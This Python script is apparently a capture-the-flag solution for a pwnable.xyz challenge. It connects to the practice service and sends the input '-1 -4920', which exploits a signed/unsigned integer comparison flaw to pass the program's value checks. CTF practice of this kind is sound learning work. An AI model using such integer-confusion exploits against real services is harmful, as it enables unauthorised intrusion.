#!/usr/bin/env python3
import socket
import sys
import time

PROMPT = b"input:"

def recv_until(sock, token=PROMPT, timeout_sec=3.0):
    sock.settimeout(timeout_sec)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            if token in data:
                break
    except socket.timeout:
        pass
    return b"".join(chunks)

def recv_all_brief(sock, timeout_sec=2.0):
    sock.settimeout(timeout_sec)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        pass
    return b"".join(chunks)

def try_connect(host: str, port: int, timeout_sec: float = 5.0):
    try:
        return socket.create_connection((host, port), timeout=timeout_sec)
    except socket.gaierror:
        if host == "svc.pwnable.xyz":
            # Fallback to known IP from nmap resolution
            return socket.create_connection(("134.209.56.140", port), timeout=timeout_sec)
        raise

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "svc.pwnable.xyz"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30001
    with try_connect(host, port, 5.0) as sock:
        banner = recv_until(sock)
        sys.stdout.buffer.write(banner)
        # Send two values that, when treated as unsigned 32-bit, satisfy (a - b) == 0x1337,
        # while signed comparisons bypass the > 0x1336 checks: use a=-1 (0xFFFFFFFF), b=-4920 (0xFFFFECC8)
        payload = b"-1 -4920\n"
        sock.sendall(payload)
        time.sleep(0.05)
        rest = recv_all_brief(sock, 3.0)
        sys.stdout.buffer.write(rest)

if __name__ == "__main__":
    main()
